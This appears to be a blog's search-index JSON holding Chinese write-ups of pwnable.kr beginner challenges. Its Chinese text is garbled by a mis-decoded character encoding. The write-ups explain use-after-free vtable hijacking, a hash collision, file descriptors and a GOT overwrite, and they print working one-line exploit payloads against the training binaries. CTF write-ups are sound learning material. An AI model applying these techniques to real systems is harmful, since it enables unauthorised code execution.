cout &lt;&lt; &quot;Child2::h2&quot; &lt;&lt; endl; &#125; int child2; protected: private: &#125;; å•ä¸€ç»§æ‰¿ï¼Œæ— è™šå‡½æ•°é‡è½½ å•ä¸€ç»§æ‰¿ï¼Œé‡è½½äº†è™šå‡½æ•° å¤šé‡ç»§æ‰¿ æ€»ç»“ å¦‚æœä¸€ä¸ªç±»ä¸­æœ‰è™šå‡½æ•°ï¼Œé‚£ä¹ˆå°±ä¼šå»ºç«‹ä¸€å¼ è™šå‡½æ•°è¡¨vtableï¼Œå­ç±»ç»§æ‰¿çˆ¶ç±»vtableï¼Œè‹¥ï¼Œçˆ¶ç±»çš„vtableä¸­ç§æœ‰(private)è™šå‡½æ•°,åˆ™å­ç±»vtableä¸­åŒæ ·æœ‰è¯¥ç§æœ‰(private)è™šå‡½æ•°çš„åœ°å€ã€‚æ³¨æ„è¿™å¹¶ä¸æ˜¯ç›´æ¥ç»§æ‰¿äº†ç§æœ‰(private)è™šå‡½æ•° å½“å­ç±»é‡è½½çˆ¶ç±»è™šå‡½æ•°æ—¶ï¼Œä¿®æ”¹vtableåŒåå‡½æ•°åœ°å€ï¼Œæ”¹ä¸ºæŒ‡å‘å­ç±»çš„å‡½æ•°åœ°å€ï¼Œè‹¥å­ç±»ä¸­æœ‰æ–°çš„è™šå‡½æ•°ï¼Œåœ¨vtableå°¾éƒ¨æ·»åŠ ã€‚ vptræ¯ä¸ªå¯¹è±¡éƒ½ä¼šæœ‰ä¸€ä¸ªï¼Œè€Œvptableæ˜¯æ¯ä¸ªç±»æœ‰ä¸€ä¸ªï¼ŒvptræŒ‡å‘vtableï¼Œä¸€ä¸ªç±»ä¸­å°±ç®—æœ‰å¤šä¸ªè™šå‡½æ•°ï¼Œä¹Ÿåªæœ‰ä¸€ä¸ªvptrï¼›åšå¤šé‡ç»§æ‰¿çš„æ—¶å€™ï¼Œç»§æ‰¿äº†å¤šä¸ªçˆ¶ç±»ï¼Œå°±ä¼šæœ‰å¤šä¸ªvptr Use-After-FreeDangling pointer Dangling pointerå³æŒ‡å‘è¢«é‡Šæ”¾çš„å†…å­˜çš„æŒ‡é’ˆï¼Œé€šå¸¸æ˜¯ç”±äºé‡Šæ”¾å†…å­˜åï¼Œæœªå°†æŒ‡é’ˆç½®ä¸ºNULLã€‚ UAFåŸç†å¯¹Dangling pointeræ‰€æŒ‡å‘å†…å­˜è¿›è¡Œuseï¼Œå¦‚æŒ‡é’ˆè§£å¼•ç”¨ç­‰ã€‚ åˆ©ç”¨æ€è·¯å°†Dangling pointeræ‰€æŒ‡å‘çš„å†…å­˜é‡æ–°åˆ†é…å›æ¥ï¼Œä¸”å°½å¯èƒ½ä½¿è¯¥å†…å­˜ä¸­çš„å†…å®¹å¯æ§ï¼ˆå¦‚é‡æ–°åˆ†é…ä¸ºå­—ç¬¦ä¸²ï¼‰ ä¸¾ä¸ªæ —å­123456typedef struct&#123; int id; char *name; int (*func)() //å‡½æ•°æŒ‡é’ˆï¼Œå¯ä»¥ç†è§£ä¸ºç±»é‡Œé¢çš„æ–¹æ³•&#125;; å‡è®¾æœ‰ä¸Šè¿°è¿™æ ·çš„ä¸€ä¸ªç»“æ„ä½“æŒ‡é’ˆpï¼Œåœ¨é‡Šæ”¾æ‰pä¹‹åï¼Œæ²¡æœ‰å°†pç½®NULLï¼Œæ‰€ä»¥på˜æˆDangling pointerï¼Œå†é€šè¿‡é‡æ–°åˆ†é…ï¼Œå†æ¬¡æ‹¿åˆ°pä¹‹å‰æŒ‡å‘çš„è¿™æ®µåœ°å€ç©ºé—´ã€‚ä¹‹åï¼Œé€šè¿‡strcpy(p2,â€addrâ€)ï¼Œæˆ–è€…å…¶ä»–æ–¹å¼ï¼Œå‘è¿™æ®µåœ°å€ç©ºé—´å†™å…¥æ–°æ•°æ®ã€‚ç„¶åå½“æˆ‘ä»¬é€šè¿‡å…¶ä»–å‡½æ•°ï¼Œå†æ¬¡ä½¿ç”¨pæŒ‡é’ˆï¼Œå°±ä¼šé€ æˆæ— æ³•é¢„æ–™çš„åæœï¼Œå› ä¸ºæ­¤æ—¶pæŒ‡é’ˆæŒ‡å‘çš„å†…å­˜åŒ…å«çš„å†…å®¹å·²ç»æ”¹å˜ã€‚ æ•°æ®æ§åˆ¶ ä»»æ„åœ°å€è¯»ï¼š$puts(p-&gt;name)â€”â€”â€”â€”â€”&gt;puts(char*(addr2))$ ä»»æ„åœ°å€å†™ï¼š$strcpy(p-&gt;name,data);â€”â€”&gt;strcpy((char *)(addr2),data)$ æ§åˆ¶æµåŠ«æŒï¼š$p-&gt;func()â€”â€”â€”â€”â€”â€”â€”&gt;call\\ addr3$ è§£é¢˜æ€è·¯æŸ¥çœ‹æ–‡ä»¶ä¿æŠ¤æªæ–½ æ€è·¯åˆ†æå¯ä»¥çœ‹å‡ºManå’ŒWomanéƒ½æ˜¯ç»§æ‰¿äº†Humanç±»ï¼Œå¹¶ä¸”å¯ä»¥çœ‹å‡ºåªè¦æˆ‘ä»¬å°†æ§åˆ¶æµåŠ«æŒåˆ°Humanç±»çš„ç§æœ‰è™šå‡½æ•°give_shellï¼Œå°±èƒ½getshelläº†ã€‚ åŸºæœ¬æ€è·¯ä¸ºï¼šå°†mainå‡½æ•°åˆ›å»ºçš„ä¸¤ä¸ªå¯¹è±¡å…ˆfreeï¼Œä½†æŒ‡é’ˆå¹¶æ²¡æœ‰è¢«é”€æ¯ï¼Œä¹‹åæˆ‘ä»¬allocateåŒæ ·çš„å¤§å°ï¼Œå¯ä»¥å¾—åˆ°åŸå…ˆè¢«é‡Šæ”¾çš„å†…å­˜ï¼Œè¿™æ ·å°±å¾—åˆ°ä¸€ä¸ªå¯æ§çš„åœ°å€ç©ºé—´ï¼Œå¹¶ä¸”è¿™ä¸ªç©ºé—´ä¸­è®°å½•äº†ä¹‹å‰vptræŒ‡é’ˆï¼Œè¿™æ ·å¯é€šè¿‡æ”¹å†™è¿™ä¸ªè™šè¡¨æŒ‡é’ˆçš„å€¼ï¼Œä¹‹åå†åˆ©ç”¨useï¼Œå³m-&gt;introduce()æ—¶ï¼ŒåŠ«æŒç¨‹åºæ‰§è¡Œæµï¼Œå°†æœ¬æ¥æ‰§è¡Œçš„introduceå‡½æ•°å˜æˆæ‰§è¡Œgive_shellå‡½æ•°ã€‚æ³¨æ„mainä¸­è¾“å…¥2åˆ†é…ç©ºé—´æ˜¯è¯»å–ä¼ å…¥çš„ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªå†³å®šåˆ†é…ç©ºé—´çš„å¤§å°ï¼Œç¬¬äºŒä¸ªæ˜¯è¯»å…¥ä¸€ä¸ªæ–‡ä»¶ï¼Œå°†æ–‡ä»¶ä¸­çš„å†…å®¹å†™å…¥åˆ°åˆšåˆšåˆ†é…çš„ç©ºé—´ä¸­ï¼Œå› æ­¤æˆ‘ä»¬é¦–å…ˆè¦å–å¾—ä¹‹å‰é‡Šæ”¾çš„ç©ºé—´ï¼Œä¸ºä¿è¯è¿™ä¸€ç‚¹ï¼Œéœ€è¦ä½¿å¾—ä¼ é€’çš„å‚æ•°å’Œä¹‹å‰é‡Šæ”¾çš„ç©ºé—´å¤§å°ç›¸åŒï¼Œè€Œä¸”è¿™é‡Œéœ€è¦åˆ†é…ä¸¤æ¬¡ï¼Œå› ä¸ºæ˜¯ä¸¤ä¸ªå¯¹è±¡ï¼Œä¹‹åæ–‡ä»¶ä¸­çš„å†…å®¹éœ€å°†ä¹‹å‰çš„è™šè¡¨æŒ‡é’ˆçš„å€¼è¦†ç›–æˆæˆ‘ä»¬æƒ³è¦çš„å€¼ï¼Œå› ä¸ºæ¯ä¸ªå¯¹è±¡ç©ºé—´ä¸­çš„ç¬¬ä¸€é¡¹è®°å½•çš„å°±æ˜¯vptrï¼Œæ‰€ä»¥ç›´æ¥å‘æ–‡ä»¶ä¸­å†™å…¥æ”¹å†™çš„è™šè¡¨æŒ‡é’ˆçš„å€¼å³å¯(ä»å¤´å¼€å§‹è¯»å…¥ï¼Œå¦åˆ™ä¸­é—´è¿˜éœ€è¦å¡«å……ä¸€äº›å­—æ®µ)ã€‚ å¯»æ‰¾vtableçš„åœ°å€ ç›´æ¥åœ¨å°†æ–‡ä»¶æ‹–å…¥IDA64ä¸­æŸ¥çœ‹ï¼ˆå½“ç„¶è¿™é‡Œä¹Ÿå¯ä»¥ç”¨gdbåŠ¨æ€è°ƒè¯•ï¼Œä»mainå‡½æ•°ä¸€æ­¥æ­¥è·Ÿè¿›ï¼‰ã€‚å› ä¸ºvptræŒ‡å‘çš„æ˜¯vtableä¸­çš„ç¬¬ä¸€é¡¹ï¼Œç”±ç¬¬ä¸€é¡¹å­˜æ”¾çš„å†…å®¹æ˜¯å‡½æ•°give_shellçš„åœ°å€ï¼Œæ‰¾åˆ°give_shellçš„ä½ç½®å¯ä»¥ç¡®å®švptrçš„åœ°å€ä¸º$0x401570$ï¼Œç¬¬äºŒé¡¹ï¼Œå³vptr+8æ‰€æŒ‡å‘çš„ä½ç½®ï¼Œå­˜æ”¾çš„å†…å®¹æ˜¯å­ç±»é‡å†™çš„å‡½æ•°introduceçš„åœ°å€ï¼Œmainå‡½æ•°ä¸­è¾“å…¥1ï¼ˆuseï¼‰ä¼šè°ƒç”¨introduceå‡½æ•°ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦åœ¨è°ƒç”¨introduceå‡½æ•°æ—¶ï¼Œè®²vptrçš„æŒ‡é’ˆæŒ‡å‘give_shellå‡½æ•°ï¼Œå³å°†æŒ‡é’ˆå‘å‰ç§»åŠ¨8ä¸ªå­—èŠ‚é•¿åº¦ã€‚ 10x401570 - 8 = 0x401568 -&gt; \\x68\\x15\\x40\\x00\\x00\\x00\\x00\\x00 ç¡®å®šæ¯ä¸ªå¯¹è±¡åˆ†é…çš„ç©ºé—´å¤§å° å¯è§åŸæœ¬åˆ†é…çš„ä¸¤ä¸ªå¯¹è±¡çš„ç©ºé—´ä¸º$0x18 = 24Byte$ï¼Œæ‰€ä»¥ä¹‹ååˆ†é…çš„ç©ºé—´ä¹ŸåŒæ ·ä¸º24å­—èŠ‚ã€‚ï¼ˆè¿™é‡Œæ²¡æœ‰å¿…è¦æ‰‹åŠ¨è®¡ç®—ç±»å¯¹è±¡æ‰€å ç©ºé—´çš„å¤§å°ï¼Œå› ä¸ºä¸åŒæœºå™¨å¯èƒ½ä¼šå­˜åœ¨å·®å¼‚ï¼ŒçŸ¥é“å­˜åœ¨å“ªäº›é¡¹å³å¯ï¼Œä¸å¿…è¿‡äºçº ç»“ä¸ºä»€ä¹ˆæ˜¯24å­—èŠ‚ã€‚ï¼‰ æ•´ç†å¦‚ä¸‹ è¾“å…¥3ï¼ˆfreeï¼‰ï¼šå°†åˆ†é…çš„manå’Œwomançš„ç©ºé—´é‡Šæ”¾ï¼ˆè¿™é‡Œå…ˆé‡Šæ”¾manï¼Œåœ¨é‡Šæ”¾womanï¼‰ è¾“å…¥2ï¼ˆallocateï¼‰ï¼šå…ˆå°†womané‡Šæ”¾çš„ç©ºé—´é‡æ–°æ‹¿å› è¾“å…¥2ï¼ˆallocateï¼‰ï¼šå†å°†mané‡Šæ”¾çš„ç©ºé—´é‡æ–°æ‹¿å› è¾“å…¥ï¼ˆuseï¼‰ï¼šé€šè¿‡ä¼ é€’çš„å‚æ•°å·²ç»æ”¹å†™äº†vptrçš„å€¼ï¼Œæ‰§è¡Œintroduceå³give_shellï¼Œæ‹¿åˆ°flag PWN1python -c &quot;print &#x27;\\x68\\x15\\x40\\x00\\x00\\x00\\x00\\x00&#x27;&quot; &gt; /tmp/exp.txt","categories":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/"},{"name":"Pwnable.kr","slug":"PWN/Pwnable-kr","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Pwnable-kr/"},{"name":"Toddler's Bottle","slug":"PWN/Pwnable-kr/Toddler-s-Bottle","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Pwnable-kr/Toddler-s-Bottle/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/PWN/"}]},{"title":"random","slug":"Pwnable_kr/random","date":"2020-10-15T11:10:35.000Z","updated":"2020-10-19T07:10:12.000Z","comments":true,"path":"2020/10/15/Pwnable_kr/random/","link":"","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/2020/10/15/Pwnable_kr/random/","excerpt":"","text":"æŸ¥çœ‹random.cæºä»£ç  å‡½æ•°çš„æ•´ä¸ªæ‰§è¡Œæµç¨‹æ˜¯randï¼ˆï¼‰äº§ç”Ÿçš„éšæœºå€¼å’Œè¾“å…¥çš„å¯†é’¥è¿›è¡Œå¼‚æˆ–ï¼Œè‹¥å…¶ç»“æœç­‰äº$0xdeadbeef$ï¼Œåˆ™å¯ä»¥æ‰§è¡Œsystemå‡½æ•°ï¼Œæ‹¿åˆ°flagã€‚ randï¼ˆï¼‰å‡½æ•° ç”±æ­¤å¯è§ï¼Œå¦‚æœä¸é‡æ–°ç”Ÿæˆç§å­ï¼ˆä¸€èˆ¬æƒ…å†µä¸‹ï¼Œé»˜è®¤ç”Ÿæˆç§å­ä¸º1ï¼‰ï¼Œåˆ™æ¯æ¬¡äº§ç”Ÿçš„éšæœºæ•°å°†ä¼šæ˜¯ä¸€ä¸ªå›ºå®šå€¼ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥çš„ä»»åŠ¡å°±æ˜¯ç¡®å®šè¿™ä¸ªå›ºå®šå€¼ã€‚ æŸ¥çœ‹éšæœºæ•°$disassemble /r \\ main$æŸ¥çœ‹æ±‡ç¼–ä»£ç  åœ¨cmpå¤„ä¸‹æ–­ç‚¹æ±‡ç¼–ä»£ç ä¸­ï¼Œåœ¨è¿›è¡Œcmpä¹‹å‰å…ˆè¿›è¡Œäº†ä¸€æ¬¡å¼‚æˆ–è¿ç®—ï¼Œæ˜¾ç„¶è¿™æ˜¯å°†ç”¨æˆ·è¾“å…¥çš„keyå’Œç”Ÿæˆçš„éšæœºæ•°è¿›è¡Œå¼‚æˆ–ï¼Œç”±æ­¤å¯ä»¥åˆ¤æ–­éšæœºæ•°çš„ä½ç½®ä¸º$rbp-4$ï¼ˆå…ˆå‹å…¥æ ˆä¸­ï¼‰ï¼Œå› æ­¤ä½¿ç”¨$x/10x \\ $rbp-4$æŸ¥çœ‹å†…å­˜çš„å€¼å³å¯ã€‚ æ‰€ä»¥ç”Ÿæˆçš„éšæœºæ•°ä¸º0x6b8b4567ï¼Œå¯å¤šæ¬¡è¿è¡Œç¨‹åºæŸ¥çœ‹å…¶å€¼æ˜¯å¦å‘ç”Ÿå˜åŒ–ï¼Œè¿™é‡Œä¸åšæ¼”ç¤ºã€‚ PWNæ±‚å‡º$0x6b8b4567\\oplus 0xdeadbeef$çš„å€¼è¾“å…¥å³å¯","categories":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/"},{"name":"Pwnable.kr","slug":"PWN/Pwnable-kr","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Pwnable-kr/"},{"name":"Toddler's Bottle","slug":"PWN/Pwnable-kr/Toddler-s-Bottle","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Pwnable-kr/Toddler-s-Bottle/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/PWN/"}]},{"title":"collision","slug":"Pwnable_kr/collision","date":"2020-10-15T11:10:23.000Z","updated":"2020-10-19T07:09:52.000Z","comments":true,"path":"2020/10/15/Pwnable_kr/collision/","link":"","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/2020/10/15/Pwnable_kr/collision/","excerpt":"","text":"æŸ¥çœ‹Cè¯­è¨€æºä»£ç  main(int argc, char* argv[]) ä¼ é€’ä¸‰ä¸ªå‚æ•°$aa,bb,cc$, ç¨‹åºè¿è¡Œç»“æœå¦‚ä¸‹: æ³¨æ„ï¼šè‹¥ä¼ é€’nä¸ªå‚æ•°ï¼Œå®é™…ä¸Šç›¸å½“äºç»™mainå‡½æ•°ä¼ é€’äº†n+1ä¸ªå‚æ•°ï¼Œargc=n+1ï¼ˆå› ä¸ºargv[0]æ˜¯è·¯å¾„åè‡ªåŠ¨ä¼ é€’ï¼‰ åˆ†æcol.c å‡½æ•°ä¼ é€’äº†ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ä¸ºintå‹ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºä¸€ä¸ªå­—ç¬¦æ•°ç»„ï¼Œmainå‡½æ•°é¦–å…ˆåˆ¤æ–­ç¬¬ä¸€ä¸ªå‚æ•°å¦‚æœå°äº2,å³è‹¥ä¸æ˜¾å¼ä¼ é€’å‚æ•°ï¼Œåˆ™æ‰“å°argv[0]ä¹‹åä¼šç›´æ¥é€€å‡ºã€‚ argv[1]ï¼Œå³ä¼ å…¥çš„ç¬¬äºŒä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ä¸ºæ–‡ä»¶æ‰€åœ¨è·¯å¾„ï¼ŒæŒ‡å‘çš„å­—ç¬¦ä¸²çš„é•¿åº¦éœ€è¦ç­‰äº20å­—èŠ‚ã€‚ check_passwordå‡½æ•°å°†æŒ‡å‘20å­—èŠ‚çš„å­—ç¬¦æŒ‡é’ˆè½¬ä¸ºintæŒ‡é’ˆï¼Œå› ä¸ºintæ˜¯4å­—èŠ‚ï¼Œå³å°†20å­—èŠ‚å­—ç¬¦ä¸²æ‹†åˆ†æˆä¸º5ä¸ªintç±»å‹çš„æ•°æ®ï¼Œä¹‹åæ±‚å’Œã€‚ å¦‚æœæ±‚å’Œçš„ç»“æœå’Œç»™å®šçš„å“ˆå¸Œå€¼0x21DD09ECç›¸ç­‰ï¼Œåˆ™ä¼šæ‰§è¡Œsystemå‡½æ•°æ‹¿åˆ°flagã€‚ æœ€ç›´æ¥çš„æƒ³æ³•æ˜¯æš´åŠ›ç©·ä¸¾ï¼Œå¯»æ‰¾å“ˆå¸Œç¢°æ’ï¼Œä½†å®é™…ä¸Šè¿™é‡Œå¯ä»¥ç›´æ¥å‡‘å‡ºè¿™ä¸ªå“ˆå¸Œå€¼ï¼Œå¯ä»¥ä»¤20å­—èŠ‚çš„å‰16å­—èŠ‚éƒ½è®¾ç½®ä¸º0x01ï¼Œæ³¨æ„ä¸èƒ½è®¾ç½®ä¸º0x00ï¼Œå› ä¸º0x00æ˜¯ä¸€ä¸ªæˆªæ–­å­—ç¬¦ï¼Œç¨‹åºè¯»å…¥argv[1]æ—¶å¦‚æœé‡åˆ°äº†0x00ä¼šè‡ªåŠ¨æˆªæ–­ï¼Œä»è€Œå¯¼è‡´ç¨‹åºç»“æœæœ‰è¯¯ã€‚ å¦å¤–ï¼Œæ³¨æ„æ•°æ®æŒ‰ç…§å°ç«¯åºå­˜æ”¾ï¼š ç¼–å†™pythonè„šæœ¬ 12./col $(python -c &quot;print &#x27;\\x01\\x01\\x01\\x01&#x27;*4 + &#x27;\\xe8\\x05\\xd9\\x1d&#x27;&quot;)# è¿™ä¸€inlineçš„pythonè¡¨è¾¾å¼å¯ä»¥å°†ç”Ÿæˆçš„ç»“æœä½œä¸ºargv[1]å‚æ•° PWN","categories":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/"},{"name":"Pwnable.kr","slug":"PWN/Pwnable-kr","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Pwnable-kr/"},{"name":"Toddler's Bottle","slug":"PWN/Pwnable-kr/Toddler-s-Bottle","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Pwnable-kr/Toddler-s-Bottle/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/PWN/"}]},{"title":"flag","slug":"Pwnable_kr/flag","date":"2020-10-15T11:10:06.000Z","updated":"2020-10-19T07:10:00.000Z","comments":true,"path":"2020/10/15/Pwnable_kr/flag/","link":"","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/2020/10/15/Pwnable_kr/flag/","excerpt":"","text":"checksecæŸ¥çœ‹æ–‡ä»¶å±æ€§ windowsä¸‹ä½¿ç”¨upx -då‘½ä»¤è§£å‹ç¼© IDA64æ‰“å¼€è§£å‹ç¼©çš„æ–‡ä»¶ å°†flagçš„å€¼å­˜æ”¾åˆ°destä¸­ï¼Œç›´æ¥æŸ¥çœ‹flagå³å¯","categories":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/"},{"name":"Pwnable.kr","slug":"PWN/Pwnable-kr","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Pwnable-kr/"},{"name":"Toddler's Bottle","slug":"PWN/Pwnable-kr/Toddler-s-Bottle","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Pwnable-kr/Toddler-s-Bottle/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/PWN/"}]},{"title":"fd","slug":"Pwnable_kr/fd","date":"2020-10-15T10:59:24.000Z","updated":"2020-10-19T07:09:56.000Z","comments":true,"path":"2020/10/15/Pwnable_kr/fd/","link":"","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/2020/10/15/Pwnable_kr/fd/","excerpt":"","text":"ç™»å½•è¿œç¨‹æœåŠ¡å™¨ ls -laæŸ¥çœ‹æ–‡ä»¶ä¿¡æ¯linuxæ–‡ä»¶æƒé™çŸ¥è¯† å‘ç°fd.cå’Œå…¶å¯¹åº”çš„å¯æ‰§è¡Œæ–‡ä»¶fdï¼ˆç”¨æˆ·æœ‰æ‰§è¡Œæƒé™ï¼‰ cat fd.cæŸ¥çœ‹cè¯­è¨€ä»£ç  æœ‰æºä»£ç å¯çŸ¥ï¼Œè¿™é‡Œéœ€è¦æ‰§è¡Œsystemå‡½æ•°çš„æ¡ä»¶ä¸ºbufç¼“å†²åŒºå†…å®¹ä¸ºLETMEIWN read(fd,buf,32)1234567read(fd, buf, 32)fd == 0æ—¶ï¼šåˆ™è¡¨ç¤ºæ ‡å‡†è¾“å…¥ï¼›fd == 1æ—¶ï¼šåˆ™è¡¨ç¤ºæ ‡å‡†è¾“å‡ºï¼›fd == 2æ—¶ï¼Œåˆ™è¡¨ç¤ºæ ‡å‡†è¾“å‡ºé”™è¯¯ã€‚buf è¡¨ç¤ºè¯»å…¥çš„ç¼“å†²åŒºï¼›32è¡¨ç¤ºè¯»å…¥32å­—èŠ‚ï¼› å› æ­¤æˆ‘ä»¬éœ€è¦è®¾ç½®fdä¸º0ï¼Œè¯»å–æˆ‘ä»¬è¾“å…¥çš„LETMEWINåˆ°bufç¼“å†²åŒºä¸­å³å¯è·å¾—flagã€‚ æ³¨æ„åˆ° 1fd = atoi(argv[1]) - 0x1234 è¦ä½¿å¾—$fd=0$ï¼Œå°±æ˜¯è®©mainå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°argv[1]ç­‰äº$0x1234$ ./fd 4660 æ³¨æ„è¿™é‡Œå‚æ•°éœ€è¦è½¬ä¸º10è¿›åˆ¶ $0x1234_{16} = 4660_{10}$ 1flag: mommy! I think I know what a file descriptor is!!","categories":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/"},{"name":"Pwnable.kr","slug":"PWN/Pwnable-kr","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Pwnable-kr/"},{"name":"Toddler's Bottle","slug":"PWN/Pwnable-kr/Toddler-s-Bottle","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Pwnable-kr/Toddler-s-Bottle/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/PWN/"}]},{"title":"passcode","slug":"Pwnable_kr/passcode","date":"2020-10-15T07:08:39.000Z","updated":"2020-10-19T07:10:08.000Z","comments":true,"path":"2020/10/15/Pwnable_kr/passcode/","link":"","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/2020/10/15/Pwnable_kr/passcode/","excerpt":"","text":"æŸ¥çœ‹passcode.cæºæ–‡ä»¶ ç¬¬ä¸€ååº”ä¸ºä½¿å¾—passcode1ä¸º338150ã€passcode2ä¸º13371337ï¼Œä¹‹åè°ƒç”¨systemå‡½æ•°ã€‚ loginå‡½æ•°ä¸­è¦æ±‚è¾“å…¥ä¸¤ä¸ªå¯†ç passcode1å’Œpasscode2ï¼Œä½†scanfå‡½æ•°ç”¨æ³•é”™è¯¯ï¼Œå…¶åå¹¶æ²¡æœ‰åŠ ä¸Š&amp;ç¬¦å·å–å…¶åœ°å€ï¼Œè€Œæ˜¯ç›´æ¥ä½¿ç”¨äº†æ ˆä¸Šä¸¤ä¸ªæ²¡æœ‰åˆå§‹åŒ–çš„éšæœºå€¼ï¼Œå› æ­¤ç›´æ¥è¾“å…¥åˆ™ä¼šå‡ºç°segmentation faultã€‚å› æ­¤è€ƒè™‘åœ¨loginå‡½æ•°ä¹‹å‰æ‰§è¡Œçš„welcomeå‡½æ•°ã€‚ welcomeå‡½æ•°è¦æ±‚ç”¨æˆ·è¾“å…¥å§“åçš„å­—ç¬¦ä¸²ï¼Œä½†æ˜¯å…è®¸è¾“å…¥100å­—èŠ‚é•¿åº¦ï¼Œå› æ­¤å°è¯•ä½¿ç”¨å…¶è¦†ç›–æ ˆä¸Šä¸¤ä¸ªå˜é‡çš„â€œéšæœºå€¼â€ã€‚ gdb passcodeæŸ¥çœ‹å…¶æ±‡ç¼–ä»£ç disassemble /r welcome disassemble /r login å‘ç°charæ•°ç»„åœ¨$ebp - 0x70$å¤„ï¼Œè€Œpasscode1ã€passcode2åˆ†åˆ«åœ¨$ebp - 0x10ã€ebp - 0xc$å¤„ï¼Œå…¶ç›¸å·®çš„è·ç¦»$0x70 - 0x10 = 96 &lt; 100,0x70 - 0xc = 100$ï¼Œå› æ­¤å¹¶ä¸èƒ½ç›´æ¥é€šè¿‡è¾“å…¥å§“åå­—ç¬¦ä¸²è¦†ç›–å˜é‡passcode2,åªå¯ä»¥è¦†ç›–passcode1ã€‚ è½¬æ¢æ€è·¯æŸ¥çœ‹æ–‡ä»¶ä¿æŠ¤æªæ–½ æ ˆä¸Šå¼€å¯äº†Canaryæœºåˆ¶ï¼Œå› æ­¤æ ˆæº¢å‡ºå¾ˆéš¾æˆåŠŸï¼Œå‘ç°æ²¡æœ‰å¼€å¯PIEï¼Œå› æ­¤å¯ä»¥é€šè¿‡ä¿®æ”¹æŸäº›å‡½æ•°gotè¡¨çš„åœ°å€ï¼Œè¿›è¡Œè°ƒç”¨systemå‡½æ•°ã€‚å®é™…ä¸Šï¼Œæ—¢ç„¶scanfæ˜¯ä¸€ä¸ªå…·æœ‰å†™åŠŸèƒ½çš„å‡½æ•°ï¼Œæˆ‘ä»¬å®Œå…¨å¯ä»¥åˆ©ç”¨scanfæ¥ä¿®æ”¹æ­¤åä½¿ç”¨åˆ°çš„æŸä¸ªå‡½æ•°çš„gotè¡¨é¡¹ã€‚ä¾‹å¦‚ï¼Œç¨‹åºåœ¨scanf(â€œ%dâ€, passcode1);**åç«‹å³ä½¿ç”¨äº†fflushå‡½æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬å®Œå…¨å¯ä»¥å…ˆæ‰¾åˆ°fflushçš„gotè¡¨é¡¹åœ°å€ï¼ˆç¨‹åºæ²¡æœ‰å¼€PIEï¼Œæ— éœ€leakï¼‰ï¼ŒæŠŠpasscode1å¸ƒå±€ä¸ºè¯¥åœ°å€ï¼Œå¹¶åœ¨è°ƒç”¨åˆ°scanf(â€œ%dâ€, passcode1)æ—¶è¾“å…¥ç¨‹åºä»£ç ä¸­è°ƒç”¨system(â€œ/bin/cat flagâ€);**å¤„çš„åœ°å€ï¼Œè¿™æ ·æ‰§è¡Œfflushå‡½æ•°æ—¶å°±ä¼šæ‰§è¡Œsystemå‡½æ•°ã€‚ æ³¨æ„è¿™é‡ŒåŒºåˆ†gotè¡¨æœ¬èº«çš„åœ°å€å’Œå†™å…¥gotè¡¨é¡¹ä¸­çš„åœ°å€ fflushå‡½æ•°çš„åœ°å€ fflushåœ°å€ä¸º$0x0804a004$ systemå‡½æ•°çš„åœ°å€ è¿™é‡Œæ³¨æ„systemå‡½æ•°éœ€è¦å°†å‚æ•°å…ˆå‹æ ˆä¹‹åå†è°ƒç”¨ï¼Œå³çœŸæ­£è°ƒç”¨çš„å‡½æ•°åœ°å€ä¸º$0x080485e3$ï¼Œå³åœ¨printfå‡½æ•°ä¹‹åæ‰§è¡Œã€‚ ç¼–å†™pythonè„šæœ¬1python -c &quot;print &#x27;A&#x27; * 96 + &#x27;\\x04\\xa0\\x04\\x08&#x27; + &#x27;134514147\\n&#x27;&quot; | ./passcode å› ä¸ºpasscodeæ˜¯è¾“å…¥intå‹ï¼Œå³è¾“å…¥$0x080485e3 = 134514147$ã€‚ PWN","categories":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/"},{"name":"Pwnable.kr","slug":"PWN/Pwnable-kr","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Pwnable-kr/"},{"name":"Toddler's 